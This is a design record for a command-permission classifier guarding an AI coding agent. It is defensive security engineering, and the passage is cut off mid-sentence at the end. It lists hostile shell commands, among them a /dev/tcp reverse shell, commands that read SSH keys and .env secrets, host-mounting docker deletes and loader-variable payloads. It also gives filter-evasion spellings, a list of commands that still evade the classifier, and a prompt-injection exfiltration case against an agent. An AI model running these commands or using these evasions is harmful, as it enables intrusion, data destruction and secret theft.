# Permission floor (roadmap step 10)

Date: 2026-09-13, implemented 2026-09-18. Provenance: roadmap
`.dump/app/roadmap/10-permission-floor.md`, `FULL-REVIEW.md` §6.3, and four
design questions put to the user and answered on 2026-09-18 (all four accepted
the recommendation).

## The problem being fixed

Every non-plan Claude run was sent to the SDK with its permission bypass
posture and the skip-permissions flag. That is not a floor: it is the absence of
one. The router then re-implemented a partial floor by hand, with a plan-mode tool
blocklist, an ask-mode approval list, and a dangerous-deletion regex, so the
effective policy lived in three places, only one provider had any of it, and the
dangerous-deletion table was unreachable from the other nine backends.

## Decision 1: the rule classes

Five, and no sixth. A tool call lands in exactly one.

| Class | What it covers | Shipped verdict |
| --- | --- | --- |
| `read-only` | Read, Glob, Grep, LS, NotebookRead, TodoWrite, BashOutput, AskUserQuestion, Skill, SlashCommand | allow |
| `approval` | Edit/Write/MultiEdit/NotebookEdit, and any Bash command no dangerous pattern matched, and any tool nobody classified | ask |
| `destructive` | the seven patterns below | deny |
| `network` | WebFetch, WebSearch, and egress commands | deny |
| `exfiltration` | a secret path reaching a reader or an egress channel | deny |

Destructive patterns, each with its own test and a near-miss test beside it:
`recursive-force-delete`, `destructive-sql`, `forced-git-push`,
`discarding-git-command`, `protected-path-overwrite`, `disk-or-power`,
`init-kill`. These are the patterns `detectDangerousDeletion` carried inside the
Claude router, moved to `src/shared/permissions/classifier.ts` so the rule
exists once.

Network is a verb list (`curl`, `wget`, `nc`, `ncat`, `netcat`, `telnet`,
`ssh`, `scp`, `sftp`, `ftp`, `lftp`), the remote git subcommands (`push`,
`fetch`, `clone`, `pull`, `remote`, `ls-remote`), the publish subcommands
(`npm|yarn|pnpm|cargo publish`, `twine upload`), and remote-target `rsync`.

**Residual Bash is `approval`, not `deny`.** This is the decision that keeps the
app usable: `npm test`, `git status` and package installs have to keep working
without a policy file. They are not read-only, so they ask in ask mode and allow
in the acting modes, exactly as the shipped floor sets it.

## Decision 2: precedence

Fixed order, highest first. Implemented in
`src/main/lib/permissions/evaluator.ts` and tested there.

0. **Unknown mode → deny `mode.unknown`.** A mode this app has no floor for
   fails rather than falling back to a wider posture. This is PA-8 in
   `provisional-assumptions.md`.
1. **Path safety → deny `path.<CODE>`.** The containment and symlink checks run
   before any policy, because a path that escapes the worktree is out of scope
   whatever its class. **Turbo is exempt from this step** unless the class is
   `exfiltration`, so turbo can read `/etc/hosts` but still cannot reach
   `~/.ssh/id_ed25519`. See decision 4.
2. **Plan-mode floor.** `ExitPlanMode` → deny `plan.exit-plan-mode`; read-only →
   fall through; approval + shell command → deny `plan.no-shell`; approval +
   markdown → allow `plan.markdown-edit`; approval + anything else → deny
   `plan.markdown-only`; every other class → deny `plan.read-only`.
3. **The critical-path breaker → ask `critical-path.<id>`.** Runs above the
   allow-list, so a user entry cannot pre-approve deleting the filesystem root.
   It downgrades `allow` to `ask` and never widens anything else. See decision 9.
4. **The mode's allow-list → allow `allow-list.<index>`.** Checked after the
   plan floor, never for `exfiltration`, and never when step 3 found a breach, so
   no entry a user writes can carry a secret out or reformat a disk.
5. **The policy verdict → `<class>.mode.<mode>` or `<class>.policy`.** A
   per-mode verdict beats the class verdict, because the mode is what the user
   picked for this run.
6. **A throw anywhere → deny `evaluator.error`.** The gate never throws at its
   caller, because a caller left to invent a fallback is how the bypass got
   there in the first place.

Note what step 2 costs: in plan mode a destructive or exfiltrating action is
denied with rule `plan.read-only`, not with its own class rule. The floor sits
above the class verdict on purpose, because plan mode narrows only, and the reason
text still names the class, so the user is not left guessing.

## Decision 3: the SDK posture is `default`, not `acceptEdits`

The roadmap's §6.4 table says `agent → acceptEdits`. **That is overridden.**
Anthropic documents that a tool call auto-approved by a permission mode never
reaches `canUseTool`, and that `acceptEdits` auto-approves Edit and Write plus
the shell commands `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp` and `sed`
(<https://docs.claude.com/en/docs/claude-code/sdk/sdk-permissions>, read
2026-09-18; confirmed against the pinned SDK types for 0.2.45). Under
`acceptEdits` those calls would never reach the gate, so the floor would not
cover the file writes it exists to cover.

`default` is the posture Anthropic describes as requiring a `canUseTool`
callback to handle approval, and it still auto-allows reads inside the working
directory, which the `read-only` class allows anyway. So ask, edit, agent and
turbo all run under `default` and the policy decides; plan keeps `plan`.

The user was asked and accepted this override.

## Decision 4: turbo is the opt-out tier (revised 2026-09-18)

Superseded. The first cut of this step gave turbo an empty allow-list and denied
destructive commands and network egress, on the argument that a headless provider
cannot prompt so anything unlisted should fail closed. The owner rejected that on
2026-09-18. Turbo is the mode a user selects precisely because they do not want
to be asked, and shipping it with the same refusals as edit mode left the tier
with no reason to exist.

The shipped floor is now `read-only`, `approval`, `destructive` and `network` all
`allow`, with `exfiltration` at `deny`. Two things survive the opt-out.

1. **Exfiltration still denies.** Reading a secret path and posting a secret
   somewhere are the actions that cannot be undone by re-running anything, and
   they are the ones a prompt would not have caught anyway because nobody reads
   them in turbo.
2. **The critical-path breaker still asks.** See decision 9.

Turbo also stops refusing paths outside the worktree, so `Read("/etc/hosts")`
resolves on its class instead of tripping containment. Containment is unchanged
in plan, ask, edit and agent. `evaluator.test.ts` asserts the exemption and the
four modes that keep it, one case each.

**This is the one place the step's acceptance criteria are not met as written.**
Criterion 3 asks that an unset policy file yields deny-by-default rather than the
old bypass. It holds for four modes and for the two classes above. It no longer
holds for destructive commands or network egress in turbo, where an unset policy
file now allows them. That is a deliberate product decision by the owner, not a
wiring gap, and it is recorded in the benchmark next to the numbers that show it.

The tooltip copy in `src/renderer/features/agents/lib/mode-display.ts` says what
turbo actually does now, including that destructive commands and network egress
both run.

## Decision 5: the tool-rule grammar has four spellings (revised 2026-09-18)

Superseded. The first cut refused `Tool(prefix:*)`, treating its colon as
ambiguous about whether the separator belongs to the prefix. The owner asked for
it to be supported, and the research backs that up. `:*` is Claude Code's own
spelling for a prefix rule, so refusing it means a user who copies a working
`settings.json` rule into `permissions.toml` gets a schema error for a rule that
does exactly what they expect.

`parseToolRule` now accepts all four.

| Spelling | Match | Example |
| --- | --- | --- |
| `Tool` | any call to the tool | `WebFetch` |
| `Tool(prefix *)` | startsWith, separator included | `Bash(git *)` matches `git status`, not `gitpush` |
| `Tool(prefix:*)` | startsWith, separator not implied | `Bash(npm run test:*)` matches `npm run test --watch` and `npm run test:unit`, not `npm run tests` |
| `Tool(exact)` | equality | `Bash(git status)` |

The `:*` form keeps a `separator` field on the parsed rule, and
`toolRuleMatches` requires the next character after the prefix to be that
separator or the end of the string. So `Bash(npm run test:*)` will not match
`npm run testable`. `Bash(:*)` is still refused, because an empty prefix would
match every call and there is already an unambiguous spelling for that, `Bash(*)`.

The schema error message now lists all four accepted spellings so a rejected
entry says what to write instead.

## Decision 6: fail closed on the policy file

- Absent file → the shipped floor, `source: "default"`. Never created by a read.
- Unparseable or schema-invalid file → the shipped floor,
  `source: "invalid-file"`, with the failure named on the denial, including the
  line number when the parser has one.
- A loader that throws for a reason the reader did not anticipate →
  `UNREADABLE_POLICY`, which denies every class including `read-only`. An
  unexpected failure in the thing that decides what is allowed must not leave
  the permissive defaults in charge.

The schema is `.strict()` at every level, so a typo narrows rather than being
silently ignored. `[modes.plan]` is a schema error: the evaluator owns the plan
floor, and a file that claims it would be believed by the user and dropped by
the code.

`~/.claude/settings.json` is never written by this path. mausCode policy lives
in `~/.mauscode/permissions.toml`. The pre-existing code that symlinks the
user's Claude settings into an isolated config dir still only reads it, and
`policy-file.test.ts` proves the bytes are unchanged after every read path.

## Decision 7: TOML, hand-rolled, read-only

No TOML parser is installed and `AGENTS.md` forbids adding a dependency outside
the dependency step, so `src/shared/permissions/toml.ts` parses exactly the
subset the policy file uses and rejects everything else. Rejecting is the safe
direction. The vocabulary is class verdicts plus an allow-list, not raw Claude
rule strings, so the file reads the same for every backend.

The serializer was written and then deleted: nothing writes the file yet, and an
unused export is a writer nobody tested. The settings surface that adds it will
have to stay inside this subset.

## Decision 8: agent mode splits network in two (added 2026-09-18)

Agent mode used to deny network outright. The owner asked for web access to work
in agent mode without a card, while outbound shell commands still reach a human.
Those are two different actions, so the floor now treats them differently.

`WebFetch` and `WebSearch` are on the agent mode's shipped `allow_tools`, which
means they pass at precedence step 4 and the rule id says `allow-list.0` or
`allow-list.1`. A shell command that reaches the network, such as `curl` or
`wget`, classifies as `network` and asks under `network.mode.agent`. The user
policy cannot re-deny the allow-listed tools, which is the documented property of
that step: the allow-list widens within the mode and a class verdict cannot take
that back.

An allow-list entry never matches an `exfiltration` call, so `curl -T .env` in
agent mode still denies even though `WebFetch` is allowed.

## Decision 9: the critical-path breaker asks (added 2026-09-18)

The owner chose `ask` over `deny` when asked which way a circuit breaker should
fall. The breaker is the one thing that can still stop a turbo run, so it had to
be either, and `ask` keeps a human in the loop without making the mode refuse to
clean its own build directory.

`criticalPathBreach(command, worktreeRoot?)` in
`src/shared/permissions/classifier.ts` reports a breach when a destructive verb
targets something that should not be deleted unattended.

- The filesystem root, the home directory, the current working directory, the
  parent directory, and the worktree root itself.
- Disk and power verbs, which destroy data whether or not they name a path.

The evaluator runs it at precedence step 3, above the user's allow-list and above
the class verdict. A breach nulls the allow-list hit and downgrades `allow` to
`ask` with a rule id of `critical-path.critical-delete` or
`critical-path.disk-or-power`. It only ever narrows. A breach cannot turn a deny
into an ask, because an ask is wider than a deny.

Two invariants are tested rather than assumed. `sudo` is stripped before the scan,
so `sudo rm -rf /` breaches too. The reason names the target in plain English and
never echoes the command text, because the reason is rendered in the transcript.

This mirrors upstream behaviour. Claude Code keeps a circuit breaker in its own
most permissive mode, where deleting the filesystem root or the home directory
still prompts even though every allow rule is ignored.

## Decision 10: what the engine-only providers get (added 2026-09-18)

The capability manifest already records `permissionFloor` as `engine-only` for the
nine providers without an app gate. Turbo now needs an explicit rule list there
too, because a broad app-side allow does not travel through a provider that only
understands its own flags.

Grok is the case that matters, since it has a rule grammar. `GROK_TURBO_ALLOW` in
`src/main/lib/grok-print/args.ts` is `Bash(*)`, `WebFetch` and `WebSearch`, and
`allowRulesFor()` unions it with the policy file's `allow_tools` for turbo only.
Edit and agent pass the policy's list through unchanged. **No mode emits the
provider's always-approve token**, and `no-bypass.test.ts` plus
`grok-print/args.test.ts` assert that. Deny rules still hold under Grok's
always-approve, but mausCode does not rely on that, because it never asks for it.

The gap is recorded rather than papered over. **Engine-only providers cannot
enforce the exfiltration class or the critical-path breaker.** Grok in turbo can
carry a secret out, and the app cannot stop it, because no app-side code sees the
call. The manifest says `engine-only` for exactly this reason, and the settings
tab shows that label next to the provider so a user can see which floor they are
getting. Closing it needs a provider-side hook or a proxy, which is a follow-up
and not part of this step.

## Decision 11: the classifier reads the real verb, not the first word (added 2026-09-18)

Found in a six-pass review of this diff, then reproduced by running the shipped
classifier. `splitCommandSegments` took each segment's first word as its verb and
skipped only `sudo` and `VAR=` assignments. Every command that put something
between the shell and the verb therefore landed in the residual `approval` class,
which Agent mode allows and turbo runs without a prompt.

| Command | Before | After |
| --- | --- | --- |
| `bash -c "rm -rf /"` | approval, allowed in agent | destructive, denied in agent, asks in turbo |
| `sh -c 'rm -rf /'` | approval | destructive |
| `eval "rm -rf ~"` | approval | destructive |
| `sudo -u root rm -rf /` | approval, verb read as `-u` | destructive |
| `timeout 30 rm -rf /` | approval | destructive |
| `nice -n 5 rm -rf /` | approval | destructive |
| `xargs rm -rf /` | approval | destructive |
| `git -C /repo push --force` | approval | destructive, `forced-git-push` |
| `dd if=/dev/zero of="/dev/sda"` | approval | destructive, `disk-or-power` |

Three changes close it.

1. Quotes are stripped from every word, so `of="/dev/sda"` reads as `of=/dev/sda`
   and a quoted payload stops hiding its contents.
2. `readVerb` skips a fixed wrapper list before naming the verb. The list is
   `sudo`, `doas`, `env`, `command`, `exec`, `nohup`, `nice`, `ionice`, `time`,
   `timeout`, `stdbuf`, `xargs`, `setsid`, `chroot` and the shell verbs `sh`,
   `bash`, `zsh`, `dash`, `ksh` and `eval`. Claude Code strips the same idea
   before matching a Bash rule, which its documentation lists as timeout, time,
   nice, nohup, stdbuf and bare xargs, "so they cannot be used to smuggle a
   command past a rule". Options that take a separate value are skipped with
   their value, which is what `sudo -u root` and `nice -n 5` needed, and a bare
   duration is skipped so `timeout 30` works. `-c` is deliberately not treated as
   value-taking, because for a shell verb it introduces the payload this file has
   to read.
3. `readSubcommand` skips git's own global options, so `git -C /repo push` reads
   `push`. This is the bypass filed upstream against Claude Code as "options
   inserted between command and subcommand".

Forced push is now read from the segment rather than by a regex that needed `git`
and `push` to be adjacent. It catches the long flags, a short-flag cluster
containing `f` such as `-fu`, and the `+refspec` spelling, which forces an update
without naming a flag at all.

Three more destructive patterns were added while the gap was open: `find` with
`-delete`, `shred`, and the partition and filesystem tools `wipefs`, `fdisk`,
`cfdisk`, `sfdisk`, `parted`, `sgdisk` and `gdisk`. `systemctl poweroff` and
`service host reboot` now read their subcommand for the power verbs too. The
breaker covers `find <critical> -delete` as well as `rm` and `rmdir`.

**What was checked for false positives.** Quote stripping makes the word `rm`
appear inside `grep -rn "rm -rf" .`, and that command must stay ordinary. It
does, because the destructive and breaker checks still key on the resolved verb
rather than on the presence of a word, and `grep` resolves as the verb. The same
holds for `echo "do not run rm -rf /"`, `git rm --cached secret.txt`,
`find . -name '*.ts' -print`, `dd if=in.bin of=out.bin` and `git push origin main`.
Each is a test in `classifier.test.ts`, in a block named for what it guards
against rather than for what it does.

`SlashCommand` left `READ_ONLY_TOOLS` in the same pass. A custom slash command can
carry a `!` shell execution that does not come back through the Bash tool, so
reading it as read-only let plan mode run a command, and a repository ships its
own `.claude/commands/`. It takes the residual `approval` class, which plan mode
refuses. `Skill` stayed read-only, because a skill's actions arrive as their own
gated tool calls.

## Decision 12: the floor is enforced twice on Claude, as a hook and as canUseTool (added 2026-09-18)

Also found in review. The router passes `settingSources: ["project", "user"]`, so
the engine reads `.claude/settings.json` from the workspace and from the user's
home directory. Anthropic documents that a call an allow rule auto-approves never
reaches `canUseTool`, and `canUseTool` is where this gate lives. A repository
ships its own settings file, so a cloned workspace containing
`{"permissions":{"allow":["Bash"]}}` would have taken every shell command out
from under the floor, and nothing in the transcript would have said so. That
falsified the claim this step makes, which is that every agent action passes one
gate.

Emptying `settingSources` is the isolation mode the SDK describes, and it is not
available here, because the same option is what loads CLAUDE.md and the project's
skills. So the floor is enforced at the hook instead.

`src/main/lib/claude/permission-hook.ts` builds a `PreToolUse` matcher that runs
the same `evaluateAction` and forwards only a deny or an ask. **It never returns
allow**, so it cannot widen a posture the engine already applied, and anything it
does not object to still reaches `canUseTool` exactly as before. A throw inside it
denies. There is no `matcher` field, so it runs for every tool, because a per-tool
matcher would leave the tools nobody listed ungated.

The cost is a second evaluation per call. Measured, classification is 4.2 us mean
and the cached policy read is 2.2 us, so the duplicate is tens of microseconds
against a model round-trip. The gate is not on the critical path either way.

## Decision 13: exfiltration is not a verdict a policy file may lift (added 2026-09-18)

`resolvePolicy` refuses to merge `[modes.plan]`, and the reason recorded beside it
is that a floor a file could lift would not be a floor. The same argument applies
to the exfiltration class and had not been applied to it. A file could write
`[classes] exfiltration = "allow"`, or set it for one mode, and the gate would
then allow reading `~/.ssh/id_ed25519`. The evaluator's rule that no allow-list
entry may cover exfiltration would have been the only thing left, and it does not
constrain a class verdict.

`exfiltration = "allow"` is now a schema error in both the `[classes]` table and a
per-mode table, so the whole document fails closed and the message says to use
`ask` or `deny`. Both stay writable. Being prompted before a secret is read is a
legitimate choice and is narrower than what turbo permits for every other class,
so refusing it would be paternalism rather than a floor.

## Decision 14: an allow-list entry may not look like a flag (added 2026-09-18)

`parseToolRule` accepted any non-empty string as a tool name, so
`allow_tools = ["--always-approve"]` parsed. On the Grok path each entry is pushed
onto argv as the value of `--allow`, and the resulting command line ended
`--allow --always-approve`. A parser that reads the next token as a flag rather
than as that value would have been handed the bypass token this step exists to
keep off the command line, arriving through a side door that
`no-bypass.test.ts` cannot see, because the test reads source files and not argv.

`isToolName` now refuses a leading dash, which fails the document closed and tells
the user what to write instead. The policy file is user-owned, so the realistic
threat is a mistake rather than an attack, but the argv was wrong either way.
Grok is spawned with an argument array and no `shell: true`, so nothing in a rule
string can reach a shell.

## Decision 15: a secret a shell command names is exfiltration, egress or not (added 2026-09-19)

Found by a probe run against the built classifier, not by reading it. `cat ~/.ssh/id_ed25519` classified as `approval` with no breaker, so Agent mode allowed it and turbo ran it with no prompt at all.

That contradicted the reasoning already written above `SECRET_PATH_PATTERNS` in the same file, which says a secret path's contents leave the machine the moment a model reads them because the model's context is uploaded to the provider by design, and that no later gate can catch it. The file-tool path honoured that: `Read` with `file_path` pointing at a key denies in all five modes. The shell path required a network verb in the same segment, so the identical leak through `cat` walked past.

A network verb is no longer required. `secret-egress` still names the case where one is present, and `secret-command` names the case where one is not.

The published guidance agrees on where to break the chain. A vendor write-up of this exact attack puts it plainly: the most effective break point is the sensitive read, because if the agent cannot read `~/.ssh/id_rsa` there is nothing to exfiltrate. A hardening guide's own PreToolUse hook blocks on the path appearing in the tool input at all, with no egress condition, over a list containing `.env`, `id_rsa`, `id_ed25519`, `.ssh/`, `.aws/` and `.netrc`. CVE-2025-55284 is the reason the egress condition was never sufficient anyway: a hidden prompt in a file Claude Code analysed left with `.env` contents in DNS queries, past the network controls.

Two consequences are accepted rather than hidden. A write to a secret path is not a read, so a segment carrying a redirect into one stays with `protected-path-overwrite` and keeps its accurate reason; `echo key > ~/.ssh/authorized_keys` is a backdoored key file, not a leak. And a command that merely mentions a secret without printing it, `chmod 600 ~/.ssh/id_ed25519`, now denies. That is a false positive in the safe direction, it is rare in agent work, and telling `chmod` from `cat` reliably is not something a text classifier can do.

An earlier shape of this fix asked whether the segment contained `>` anywhere and treated the secret as written if so. That was wrong and the probe caught it: `cat ~/.ssh/id_ed25519 2>/dev/null` has a redirect and still prints the key to standard output, so the guard let the read through. The check now asks whether this word sits on the receiving end of the redirect, which is the question that matters.

## Decision 16: an environment assignment that carries code is destructive (added 2026-09-19)

Found in research rather than by probing, which is why the research pass runs. CVE-2026-55743 is a shipped desktop agent whose shell allowlist stripped leading `KEY=value` assignments before validating the command, so `GIT_PAGER=/tmp/payload.sh git log` ran the payload through an allowlisted `git`. This classifier had the same shape: `readVerb` skips any word containing `=`, by design, so the assignment was invisible to every pattern in the file and the verb read as `git`.

The variable has to be one that carries code and the value has to look executable, because the same CVE rule publishes its benign examples and they are common: `TZ=UTC git log` and `NODE_ENV=production npm test`. Both stay allowed, as do `GIT_PAGER=cat` and `EDITOR=vim`, whose values are builtins rather than paths. The carrier list covers the loader and runtime hooks (`LD_PRELOAD`, `LD_AUDIT`, `PYTHONSTARTUP`, `NODE_OPTIONS`, `PERL5OPT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`), the git program slots (`core.pager`, `core.editor`, `core.sshCommand`, `core.hooksPath`, `core.fsmonitor`, `GIT_ASKPASS`, `GIT_TEMPLATE_DIR`), the shell's own (`BASH_ENV`, `PROMPT_COMMAND`, `ENV`, `SHELL`), and the pager hooks `LESSOPEN` and `LESSCLOSE`.

Two spellings needed more than the list. `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/x.sh git log` carries an index in the name, so those are matched rather than listed. And `LESSOPEN='|/tmp/x.sh %s' less file` has a pipe inside the value, which the segment splitter cuts in half, so the check also scans the raw command. A leading `=` test guards both scans, because this runs on every shell command the gate sees.

## Decision 17: `find -exec rm` deletes, and its escaped parentheses are arguments (added 2026-09-19)

`find / -exec rm -rf {} +` classified as `approval`. It removes a whole tree and names no `rm` in the leading position, so the verb check never saw it. This is a reported bypass against a shipped agent in the wild, filed by a user who had `find` on an allow list and `rm` on a deny list and watched the command run anyway. CVE-2026-55743 is the same oversight one layer down: its guard blocked `-exec` and `-ok` but not the functionally identical `-execdir` and `-okdir`. All four are covered here, plus an exec'd path, because `find . -execdir /tmp/run.sh {} ;` runs attacker-chosen code once per matched file and names no delete verb at all. An exec'd verb that only reads stays ordinary, so `find . -execdir grep -l TODO {} +` is not caught.

The breaker reads these as deletes too, so `find / -exec rm -rf {} +` breaches the critical path.

A second probe found the grouping spelling. `find . \( -name '*.log' \) -delete` split on the escaped parentheses, which the splitter treated as a subshell, and `-delete` landed in a segment of its own with no verb attached. Escaped parentheses are now replaced before splitting, so they stay arguments. `find . \( -name x \) -delete` breaches as `critical-delete`, because `.` is a critical target on the strength of the incident already on record in this repository.

## Decision 18: bash's pseudo-device socket is a network channel (added 2026-09-19)

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` classified as `approval`. It is a reverse shell: bash opens the connection itself, so there is no network verb on the line for a verb table to find. `exec 196<>/dev/tcp/192.168.1.2/443` is the same thing with a file descriptor. Both are network now.

This is not an exotic spelling. It has a Sigma rule of its own at critical level, a Wazuh custom rule, and it appears in every reverse-shell cheat sheet, usually wrapped in `bash -c` or url-encoded. Matching `/dev/tcp/` and `/dev/udp/` anywhere in a word catches the wrapped and encoded forms too, because quotes come off first.

`/dev/tcp` is excluded from the protected-path redirect rule at the same time. `exec 196<>/dev/tcp/host/port` matched `>\s*/dev/` and reported as a write into a protected system directory, which denies the right command for the wrong reason and tells the user a file was overwritten when a socket was opened.

## Decision 19: a container that mounts the host defeats containment, so the mount is what gets caught (added 2026-09-19)

`docker run -v /:/host alpine rm -rf /host` deletes the host filesystem through a path the gate never sees. Nothing in `containment.ts` can help, because the delete happens in another mount namespace, and the command's own verb is `docker`.

It also landed in a class turbo allows. `docker run` was a network rule for the pull it usually implies, and turbo permits network, so the escape ran with no prompt in the mode that is supposed to refuse everything but exfiltration.

`run`, `create` and `exec` are no longer network for docker and podman, which also removes a card on every local container run, and a mount whose host side is `/`, `~`, `/etc`, `/home`, `/root`, `/var`, `/usr`, `/bin` or `/dev` is destructive instead. All three spellings count: `-v /:/host`, `--volume=/home:/h`, and `--mount=type=bind,source=/,target=/host`. A worktree-relative mount stays ordinary, because that is what a container is for here, and so does a named volume.

The review bot found a fourth spelling this rule missed on the push that introduced it. `docker run -v/:/host` glues the specification onto the flag cluster with no space and no equals sign, and splitting on the colon first read the host side as `-v/`, which matches nothing. The cluster comes off before the split now, so `-v/:/host`, `-v~:/h`, `-v/etc:/h` and `-itv/home:/h` all count.

## Decision 20: the wrappers, the backslash and the field separator (added 2026-09-19)

Decision 11 taught the classifier to skip wrappers and named the ones Claude Code strips. A probe of 45 spellings found the list was still short, and every gap classified as `approval`.

`su`, `runuser`, `pkexec`, `systemd-run`, `unshare`, `nsenter`, `script`, `watch`, `parallel` and `builtin` are wrappers now. `su` and `runuser` also take a subject before the command, so `su root -c 'rm -rf /'` needs the username skipped or the verb reads as `root`, which is neither a delete nor a wrapper.

A leading backslash is stripped by turning it into a forward slash, so `\rm -rf /` resolves to the verb `rm`. This is the classic spelling that steps around a shell alias and it is published as a filter bypass in its own right, spelled there as `\u\n\a\m\e \-\a`. The same substitution improves Windows paths: `C:\Users\me\.ssh\id_rsa` gains the separators the secret patterns match on, so it reaches the `.ssh/` rule instead of sliding past it.

`$IFS` becomes a space before splitting, because it is the shell's own field separator and `rm$IFS-rf$IFS/` is `rm -rf /` written without a literal space for a matcher to split on. The braced form is handled too, and published bypass write-ups use exactly this substitution to build a payload.

Decision 11's forced-push fix is now applied to the rest of git. `hasDiscardingGitCommand` was still a regex needing `git` and the subcommand to be adjacent, so `git -C /repo reset --hard` and `git --no-pager clean -fdx` both walked past. It reads the segment now. `git branch -D` needed the raw command, because lowercasing is what makes `-D`, which discards an unmerged branch, indistinguishable from `-d`, which refuses to. `git branch -f` moves a branch rather than deleting one, so it stays ordinary. `stash clear`, `reflog expire`, `filter-branch`, `filter-repo`, `update-ref -d` and `tag -d` joined the discarding set.

## Decision 21: the device rules read the subcommand, and `/dev/null` is not a disk (added 2026-09-19)

`dd` was the only write verb the disk rule knew, and it matched any `of=/dev/` prefix, which called `dd if=/dev/zero of=/dev/null` a reformat. That was a false positive in the safe direction, but it asked for a card on a benchmark idiom and it is the kind of over-block that teaches a user to approve without reading.

A block-device pattern names the device families instead, so `/dev/null`, `/dev/zero`, `/dev/shm` and the pseudo-device sockets are out.

Which verbs count, and against which argument, is the part that took two rounds. The review bot found that `cat` and `cp` had been added to the write set wholesale, so `cat /dev/sda` and `cp /dev/sda /tmp/backup` both reported as a reformat when neither writes to the device. `cat` is out entirely, because it reads its arguments and a write through it needs a redirect that the protected-path rule already reads. `cp`, `mv` and `install` count only against their last argument, which is where the bytes go, so `cp backup.img /dev/sda` is caught and `cp /dev/sda /tmp/backup` is not. `tee`, `truncate` and `shred` take every argument, and `dd` reads `of=`. Verifying the bot's two findings turned up a third it had not mentioned: `mv image.iso /dev/sdb` writes a device and was allowed.

The tools that destroy a device only for some subcommands read the subcommand or the flag: `nvme format` and `nvme sanitize`, `dmsetup remove`, `wipe_table` and `suspend`, `hdparm --security-erase`, `mdadm --zero-superblock`, `badblocks -w`, `smartctl --sanitize`. Their query forms stay ordinary, because `nvme list`, `mdadm --detail`, `hdparm -I` and `dmsetup ls` are reads and a rule that asked for a card on every query would be turned off.

Writes into a protected directory are caught without a redirect operator as well. `tee ~/.ssh/authorized_keys` installs a key and would otherwise have landed in `approval`. `cp` and `mv` only count when the protected path is the destination, so `cp /etc/passwd /tmp/copy` reads a protected file and stays ordinary.

## The residual gap, stated rather than closed

Every command in this section was run against the built classifier on 2026-09-19
and still classifies as `approval`, which Agent mode allows and turbo runs with no
prompt. The list is shorter than it was, and the boundary moved rather than
disappeared.

Still evading, verified:

- **A script written to disk and then run.** `python /tmp/evil.py`, `bash /tmp/x.sh`.
  The behaviour is in the file, and reading it to decide would mean executing it.
- **An interpreter payload with no parentheses to split on.** The parenthesised
  forms are caught now, see below, and the ones that are not reach the same place
  through a different spelling.
- **A secret named across two segments.** `cd ~/.aws && cat credentials` puts the
  directory in one segment and the bare filename in the next, so no single word
  carries a full secret path. Following a value from one segment into the next is
  data lineage, which is what a real product in this space sells, and it is out of
  scope for a classifier that is a pure function of one command string.
- **Glob and parameter spellings the shell resolves at exec time.** `/usr/bin/n[c]`
  is `nc`, `who$@ami` is `whoami`, `/usr/bin/p?ng` is `ping`. The classifier sees
  the text before the shell expands it.
- **Hex and octal escapes, base64 payloads, alias definitions, heredocs.** A
  published bypass write-up reaches the conclusion directly: every interpreter a
  denylist misses is a bypass, every quoting trick it misses is a bypass, and the
  fix that worked was to remove the shell tool and put an OS sandbox in front of it.
  A normaliser that does nine text-level rewrites still lists adversarially nested
  obfuscation as a limitation by design.

No longer evading, which the earlier text of this section claimed and was wrong
about:

- `c"h"m"o"d 777 /` is caught. Quotes come off every word before the verb is read,
  so quoted-substring reconstruction resolves to `chmod`. `c$()url` is caught the
  same way, because the splitter breaks on `$(`.
- `python -c "import os; os.system('rm -rf /')"` is caught. The splitter breaks on
  parentheses, and the inner `rm -rf /` becomes a segment of its own whose verb is
  `rm`. That is luck rather than design, and it is recorded here because claiming
  credit for it would overstate the guarantee.
- `\rm -rf /` and `rm$IFS-rf$IFS/` are caught, by decision 20.

So the claim stays precise and is now narrower than it was. This step puts a floor
under the commands the classifier can read. It does not contain arbitrary code
execution, and that needs an OS-level boundary around the spawned process, which is
a roadmap item of its own. `docs/backend-porting-recipe.md` section 7 tells a porter
to publish the same limitation rather than claim otherwise.

## What is app-enforced and what is engine-enforced

The capability manifest gained `security.permissionFloor`:

- `app-gate` is Claude. Every side-effecting call reaches `canUseTool` and goes
  through the evaluator.
- `engine-only` is the other nine. The floor is whatever the engine's own flags
  give, mapped from the same policy: grok gets `--permission-mode plan` for
  plan, a read-only `--tools` list for ask, and `acceptEdits` plus one `--allow`
  rule per allow-list entry for edit/agent/turbo.

Settings now shows the value, so a user can see which backends the floor really
covers. Grok headless turbo cannot prompt, so an unlisted destructive action
fails closed there rather than asking.

## Named follow-ups

- Cursor `--force`/`--yolo` and qwen `auto`/`yolo` are unchanged. Roadmap §8
  makes any change to an engine's own enforcement an ask-first boundary, so they
  need their own decision, not a drive-by edit.
- No main-process writer for the policy file yet; it is hand-edited.
- Seven duplicated `toErrorMessage` helpers in the renderer login-flow hooks are
  unrelated debt found while reading these files.

## Rollback

Roadmap §13 is explicit that a flag is not acceptable here, and that the record
has to say what a revert costs.

Rollback is a revert of the router mapping, which sets `permissionMode:
sdkPermissionMode(input.mode)` back to the plan/bypass ternary, and the
`canUseTool` body back to the three inline branches. **That revert restores a
bypass path**: four of the five modes would again run the SDK with permissions
bypassed and the skip-permissions flag set, which is the defect this step exists
to close. It also re-opens the hole for every step that blocks on this one
({{S16}}, {{S19}}, {{S20}}, {{S21}}, {{S22}}, {{S27}}), because each of their
unattended behaviours is defined by this floor.

So a rollback is a **human decision, not an agent one**. An agent asked to
"revert step 10" should refuse and escalate, because the thing being reverted to
is a known critical security defect. Reverting the *policy* is different and is
safe: deleting `~/.mauscode/permissions.toml` returns to the shipped floor, and
the floor denies destructive, network and exfiltration in every mode.

Partial rollback that is safe and does not need a human:

- Removing a `allow_tools` entry narrows turbo. Safe.
- Setting a class verdict back to `deny` in the policy file. Safe.
- Reverting the renderer copy or the capability-manifest field. Safe, cosmetic.

## Two findings about the step's own text

**§11's manual check does not match the floor it asked for.** It says: "run an
agent turn that tries `git push --force` in a scratch worktree, and confirm the
approval card appears." Under the shipped floor, `git push --force` classifies as
`destructive` (`forced-git-push`), and Agent mode denies destructive, so no card
appears, and none should. The card appears in **Ask** mode, which is the one
shipped widening (`[modes.ask] destructive = "ask"`). The prototype shows both:
Agent mode denying that exact command with rule `destructive.policy
(forced-git-push)`, and Ask mode producing the card. The step's wording predates
the class table and should read "confirm the denial names the rule" for Agent
mode.

**§6.4's `acceptEdits` mapping is overridden.** See decision 3. This is the one
